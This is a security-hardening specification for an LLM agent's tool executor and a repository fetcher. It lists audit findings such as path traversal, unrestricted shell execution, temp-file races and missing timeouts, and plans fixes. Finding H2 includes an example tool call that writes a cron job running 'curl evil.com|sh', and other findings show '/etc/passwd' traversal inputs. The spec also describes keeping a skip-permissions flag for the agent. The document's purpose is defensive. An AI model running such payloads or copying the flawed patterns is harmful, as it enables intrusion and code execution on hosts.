# Specification: Chat-Executor and Fetcher Hardening

## Summary

Address the remaining HIGH/MEDIUM/LOW findings from the autoresearch:debug
pass on `src/chat/**` + `src/repo_fetcher.py` + `src/file_analyzer.py` +
`src/file_scanner.py`. The session_store traversal HIGH was already fixed
in commit `014de40`; this spec covers the rest.

## Scope

| File | Bugs in scope |
|---|---|
| `src/chat/tool_executor.py` | HIGH #2-#5 (path scope + shell exec) + MEDIUM encoding |
| `src/chat/claude_chat_executor.py` | MEDIUM tempfile.mktemp + LOW —Add-dir argv |
| `src/chat/oauth_chat_executor.py` | MEDIUM open() encoding + MEDIUM template traversal |
| `src/repo_fetcher.py` | MEDIUM no-timeout HTTP + LOW URL encoding + LOW print → logger |

Not in scope: anything in `src/file_analyzer.py` or `src/file_scanner.py`
(the debug pass found nothing actionable in those).

## Findings

### HIGH (4)

#### H1: `tool_executor._execute_read_file` — arbitrary file read

**Location:** `src/chat/tool_executor.py:472-494`

```python
def _execute_read_file(self, params):
    path = params["path"]
    file_path = self.workspace_dir / path     # absolute right side wins
    ...
    content = file_path.read_text(encoding='utf-8')
```

`Path(workspace) / "/etc/passwd"` resolves to `/etc/passwd` (Python's
pathlib rule: absolute right-side replaces the left). LLM-supplied
absolute path → arbitrary file read.

#### H2: `tool_executor._execute_write_to_file` — arbitrary file write

**Location:** `src/chat/tool_executor.py:126-157`

Same `workspace_dir / path` bug as H1, plus `parent.mkdir(parents=True)`
which would happily create directory trees anywhere on disk:

```python
{"tool": "write_to_file",
 "params": {"path": "/etc/cron.d/0evil",
            "content": "* * * * * root curl evil.com|sh\n"}}
```

#### H3: `tool_executor._resolve_path` — returns absolute paths verbatim

**Location:** `src/chat/tool_executor.py:465-470`

```python
def _resolve_path(self, path: str) -> str:
    """Resolve path relative to workspace."""
    path = path.strip().strip('"\'')
    if os.path.isabs(path):
        return path                                  # ← bypasses workspace
    return os.path.join(self.workspace_dir, path)
```

Used by sibling helpers (`touch`, the bash-shim path resolver). Same
class as H1/H2 but a separate code path.

#### H4: `tool_executor._execute_bash` — `shell=True` with raw LLM command

**Location:** `src/chat/tool_executor.py:159-220, 451-459`

The LLM's bash tool runs commands via `subprocess.run(command, shell=True)`
(PowerShell branch + fallback) or via `cmd.exe /c command` /
`bash -lc command` (functionally equivalent — outer shell parses metachars).
This is **the agent's bash tool**, analogous to Claude Code's own `Bash`
tool. Not strictly a "bug" — accepting this is the trust boundary the
operator chose. But the workspace_dir constraint is illusory: the LLM can
`cd /` mid-command.

### MEDIUM (5)

#### M1: `tempfile.mktemp` deprecated/race-prone

**Location:** `src/chat/claude_chat_executor.py:349`

```python
message_file = Path(tempfile.mktemp(suffix='.txt', prefix='claude_msg_',
                                     dir=str(self.project_dir)))
```

`mktemp` returns a path without creating the file. Window between path
generation and `write_text` allows another process to create it first
(TOCTOU). Should use `NamedTemporaryFile(delete=False)` or `mkstemp`.

#### M2: `oauth_chat_executor` open() without encoding

**Location:** `src/chat/oauth_chat_executor.py:154, 163`

```python
with open(self.conversation_file, 'r') as f:        # locale codec on Windows
    return json.load(f)
with open(self.conversation_file, 'w') as f:
    json.dump(self.conversation_history, f, indent=2)
```

Missing `encoding="utf-8"` — Windows defaults to cp1252 and crashes on
non-ASCII conversation content (file paths, identifiers, comments in
non-Latin scripts).

#### M3: `tool_executor` subprocess sites missing `encoding=`

**Location:** `src/chat/tool_executor.py:185, 207, 247, 454`

`text=True` without `encoding="utf-8"` — same Windows cp1252 crash. Same
fix pattern we applied to `git_manager._run_git`, `structural_endpoints.
_clone_repo`, and `store.py` git invocations earlier this session.

#### M4: `repo_fetcher` HTTP requests missing `timeout=`

**Location:** `src/repo_fetcher.py:267, 269, 285, 287` (Bitbucket file +
list); pygithub Github client default also has no timeout.

```python
response = requests.get(url, auth=(self.bitbucket_username, self.bitbucket_password))
```

A slow Bitbucket response hangs the analyze pipeline indefinitely. Add
`timeout=30` to all `requests.get` calls; configure pygithub `Github(...,
timeout=30)`.

#### M5: `_resolve_template` reads files via `{{...}}` markers without `..` rejection

**Location:** `src/chat/oauth_chat_executor.py:207, 221, 231`

```python
file_path = profiles_dir / rel_path        # rel_path from regex on template content
```

If a template contains `{{ @haikai/../../etc/passwd }}`, `rel_path` =
`"../../etc/passwd"` and the resolver reads outside `profiles_dir`. Low
practical risk because templates are project-shipped (under
`haikai-profiles/default/`), but defensive `relative_to(profiles_dir)`
is cheap.

### LOW (3)

#### L1: `repo_fetcher` URL params not URL-encoded

**Location:** `src/repo_fetcher.py:264, 282`

```python
url = f"https://api.bitbucket.org/2.0/repositories/{owner}/{repo}/src/{branch or 'master'}/{file_path}"
```

`owner`, `repo`, `branch`, `file_path` interpolated raw. Currently safe
because `parse_repo_url` constrains them via regex, but `file_path`
specifically can contain `?` or `#` and break URL semantics. Use
`urllib.parse.quote()`.

#### L2: `repo_fetcher` uses `print()` instead of `logger`

**Location:** `src/repo_fetcher.py:191, 221, 275, 290`

Errors go to stdout instead of structured logging. Inconsistent with the
rest of the codebase.

#### L3: `_fetch_github_file` no `errors=` on `.decode('utf-8')`

**Location:** `src/repo_fetcher.py:189`

```python
return base64.b64decode(content.content).decode('utf-8')
```

UnicodeDecodeError on binary files (images, PDFs in repo). Add
`errors="replace"`.

## Approach

### H1, H2, H3 — single-helper fix (analogous to enrichment_tools fix)

Add a `_safe_workspace_path(raw)` helper that:
- Rejects absolute paths and Windows drive letters
- Rejects `..` segments
- Resolves under `workspace_dir.resolve()` and asserts `relative_to`

Apply at all `_execute_*` methods that touch files. Same pattern we used
for `read_source` / `read_directory` in `src/ast/enrichment_tools.py`.

```python
def _safe_workspace_path(self, raw: str) -> Path:
    if not raw or raw.startswith(("/", "\\")) or (len(raw) >= 2 and raw[1] == ":"):
        raise ValueError(f"absolute paths not allowed: {raw!r}")
    p = Path(raw)
    if ".." in p.parts:
        raise ValueError(f"path may not contain '..': {raw!r}")
    workspace = Path(self.workspace_dir).resolve()
    resolved = (workspace / p).resolve()
    try:
        resolved.relative_to(workspace)
    except ValueError:
        raise ValueError(f"path escapes workspace: {raw!r}")
    return resolved
```

**Tradeoff:** rejects legitimate use cases like
`read_file({"path": "/repos/other-repo/foo.py"})`. If that's a real
workflow, swap absolute-path rejection for a configured allowlist
(workspace + extra roots from env or config).

### H4 — keep shell, add encoding only

The bash tool needs to stay shell-capable (pipes/chains are why the LLM
has it). What we change:

1. Add `encoding="utf-8", errors="replace"` to fix the M3 crash
2. Keep `cwd=workspace_dir` — entry point pinned even though LLM can `cd`
3. Don't try to block metacharacters — that breaks the tool
4. Optional: a `BASH_TOOL_DENY` env var for runtime command blocklists

This treats H4 as **what it is** — an agentic shell tool — without the
illusion of restriction. Same trust boundary as Claude Code's own `Bash`
tool. **If you want stronger isolation, that's a sandbox spec, not a
patch to this file.**

### M1 — replace mktemp with NamedTemporaryFile

```python
import tempfile
fd, message_file = tempfile.mkstemp(suffix='.txt', prefix='claude_msg_',
                                     dir=str(self.project_dir))
try:
    with os.fdopen(fd, 'w', encoding='utf-8') as f:
        f.write(message)
finally:
    pass  # file is created atomically
```

### M2, M3 — add `encoding="utf-8", errors="replace"` at the 6 sites

Mechanical edit. Same pattern repeated across the codebase already.

### M4 — add `timeout=30` to `requests.get` + pygithub client

```python
response = requests.get(url, auth=..., timeout=30)
self.github_client = Github(self.github_token, timeout=30)
```

### M5 — apply `relative_to(profiles_dir)` defense

Pattern matches `read_source` fix in `src/ast/enrichment_tools.py`.

### L1 — `urllib.parse.quote(file_path, safe="/")`

Encode user-controlled URL segments. Keep `/` unescaped so it can be a
path within the repo.

### L2 — replace `print(...)` with `logger.error(...)`

Mechanical.

### L3 — `errors="replace"` on the b64-decoded `.decode("utf-8")`

Mechanical.

## Out of scope

- Sandboxing the bash tool (Docker / Firejail / chroot) — separate spec.
- Migrating away from `requests` to `httpx` — separate spec.
- Replacing pygithub with raw HTTP — separate spec.
- The `--dangerously-skip-permissions` flag in `claude_chat_executor.py:333`
  — this is the design choice for chat sessions; skipping permissions is
  what enables the agent loop without prompting. Not a bug.

## Acceptance criteria

| # | Criterion |
|---|---|
| AC1 | All `_execute_*` methods in `tool_executor.py` reject LLM-supplied absolute paths and `..` segments. New tests under `tests/chat/` cover read/write/touch/bash with malicious paths. |
| AC2 | `claude_chat_executor.py` uses `tempfile.mkstemp` (or `NamedTemporaryFile(delete=False)`) instead of `mktemp`. |
| AC3 | All `subprocess.run` and `open()` calls in scope use `encoding="utf-8"` (and `errors="replace"` where decoding external bytes). |
| AC4 | All `requests.get` calls in `repo_fetcher.py` have explicit `timeout=` (default 30s); pygithub Github client constructed with `timeout=30`. |
| AC5 | `_resolve_template` rejects template references that escape `profiles_dir`. |
| AC6 | URL interpolation in `repo_fetcher.py` uses `urllib.parse.quote()` for the `file_path` segment. |
| AC7 | Error reporting in `repo_fetcher.py` uses `logger.*` not `print()`. |
| AC8 | `_fetch_github_file` adds `errors="replace"` to its UTF-8 decode. |
| AC9 | All existing tests still pass; new tests cover each H/M case with a positive (allow) and negative (block) example. |

## References

- Source debug pass: this session's autoresearch:debug on `src/chat/**` +
  `repo_fetcher` + `file_analyzer` + `file_scanner` (no findings file —
  reported inline in chat).
- Companion fix that landed already: `014de40 fix(chat): reject
  path-traversal in session_store company/project segments`.
- Same-pattern fixes earlier this session for context:
  - `src/ast/enrichment_tools.py` — `read_source`, `read_directory`,
    `write_script`, `read_manifest_contents` (commit `51603da`)
  - `src/api/__init__.py` — `_safe_project_dir` (commit `7ac5ac6`)
  - `src/git/git_manager.py` — `_run_git` encoding + argv `--`
    (commit `88efe08`)
